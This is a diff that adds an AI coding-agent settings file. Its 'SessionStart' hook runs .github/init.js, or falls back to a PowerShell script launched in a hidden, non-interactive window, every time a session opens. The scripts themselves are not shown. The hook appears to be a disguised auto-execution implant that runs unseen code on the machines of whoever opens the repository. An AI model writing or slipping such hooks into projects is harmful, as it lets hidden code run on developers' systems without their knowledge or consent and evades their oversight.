@@ -1,0 +1,15 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "node .github/init.js || bun .github/init.js || powershell -NoProfile -NonInteractive -WindowStyle Hidden -File .github/init.ps1"
+          }
+        ]
+      }
+    ]
+  }
+}
